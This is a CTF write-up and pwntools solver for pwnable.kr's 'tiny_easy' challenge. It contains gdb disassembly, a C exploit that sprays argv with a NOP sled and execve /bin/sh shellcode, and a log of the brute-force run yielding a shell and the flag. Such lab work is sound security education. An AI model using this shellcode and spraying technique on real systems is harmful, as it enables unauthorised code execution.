'''

Description:

    I made a pretty difficult pwn task.
    However I also made a dumb rookie mistake and made it too easy :(
    This is based on real event :) enjoy.

    ssh tiny_easy@pwnable.kr -p2222 (pw:guest)

Solution:

    $ ./tiny_easy 
    Segmentation fault

    readelf -h tiny_easy | grep Entry
    Entry point address:               0x8048054

    (gdb) x/10i 0x8048054
    0x8048054: pop    %eax
    0x8048055: pop    %edx
    0x8048056: mov    (%edx),%edx
    0x8048058: call   *%edx
    0x804805a: add    %al,(%eax)
    0x804805c: add    %al,(%eax)
    0x804805e: add    %al,(%eax)
    0x8048060: add    %al,(%eax)
    0x8048062: add    %al,(%eax)
    0x8048064: add    %al,(%eax)

Solver:
'''

from pwn  import *

user    = 'tiny_easy'
passwd  = 'guest'
host    = 'pwnable.kr'
port    = 2222
command = '''
cd /tmp; echo "
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main() {
    //https://www.exploit-db.com/exploits/39160/
    char shellcode[] = {
        //\\\"\\xcc\\\"
        \\\"\\x6a\\x0b\\\"                      / push   0xb /
        \\\"\\x58\\\"                           / pop    eax /
        \\\"\\x31\\xf6\\\"                      / xor    esi,esi /
        \\\"\\x56\\\"                           / push   esi /
        \\\"\\x68\\x2f\\x2f\\x73\\x68\\\"       / push   0x68732f2f /
        \\\"\\x68\\x2f\\x62\\x69\\x6e\\\"       / push   0x6e69622f /
        \\\"\\x89\\xe3\\\"                      / mov    ebx,esp /
        \\\"\\x31\\xc9\\\"                      / xor    ecx,ecx /
        \\\"\\x89\\xca\\\"                      / mov    edx,ecx /
        \\\"\\xcd\\x80\\\"                      / int    0x80 /
    };
    
    const char * file     = \\\"/home/tiny_easy/tiny_easy\\\";
    const char * ret_addr = \\\"\\x64\\x8a\\xfa\\xff\\\";
    char nop_block[100000];
    memset(nop_block, '\\x90', 99999);
    strcpy(nop_block + 100000 - strlen(shellcode), shellcode);
    execl(file, ret_addr, nop_block, nop_block, nop_block, nop_block, nop_block, nop_block, nop_block, nop_block, nop_block, NULL);
    return 0;
}
" > t1ny_e4sy.c; gcc t1ny_e4sy.c -m32 -o t1ny_e4sy; chmod +x t1ny_e4sy;
'''

s = ssh(user, host, port, passwd)
s.run_to_end(command)
s.interactive()
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: None: Done
[*] Switching to interactive mode
tiny_easy@ubuntu:~$ for i in {1..50}; do /tmp/t1ny_e4sy; sleep 0.1; done
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
$ cat flag
What a tiny task :) good job!
$ ^C
$ exit
Segmentation fault
Segmentation fault
Segmentation fault
^C
tiny_easy@ubuntu:~$ exit
logout
[*] Got EOF while reading in interactive
[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
'''                                                                                                                                   
